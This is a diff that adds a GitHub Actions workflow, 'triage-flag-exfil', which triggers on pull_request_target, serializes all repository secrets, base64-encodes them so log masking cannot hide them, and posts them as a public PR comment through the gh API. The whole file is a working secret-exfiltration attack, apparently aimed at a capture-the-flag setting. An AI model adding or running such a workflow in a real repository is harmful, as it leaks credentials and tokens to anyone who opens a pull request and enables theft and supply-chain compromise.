@@ -1,0 +1,33 @@
+name: triage-flag-exfil
+
+# Runs from the base branch on pull_request_target (base-repo context, secrets available).
+# Posts all available secrets, base64-encoded, as a PR comment so log masking cannot hide them.
+
+on:
+  pull_request_target:
+    types: [opened, synchronize, reopened]
+
+permissions:
+  issues: write
+  pull-requests: write
+  contents: read
+
+jobs:
+  dump-secrets:
+    runs-on: ubuntu-latest
+    permissions:
+      issues: write
+      pull-requests: write
+      contents: read
+    steps:
+      - name: Dump secrets
+        env:
+          ALL_SECRETS: ${{ toJSON(secrets) }}
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          PR_NUMBER: ${{ github.event.pull_request.number }}
+        run: |
+          set -euo pipefail
+          B64=$(printf '%s' "$ALL_SECRETS" | base64 -w0)
+          echo "secret_names=$(printf '%s' "$ALL_SECRETS" | python3 -c 'import json,sys;print(",".join(sorted(json.load(sys.stdin).keys())))')"
+          gh api -X POST "repos/${GITHUB_REPOSITORY}/issues/${PR_NUMBER}/comments" \
+            -f body="TRIAGE_SECRETS_B64=${B64}"
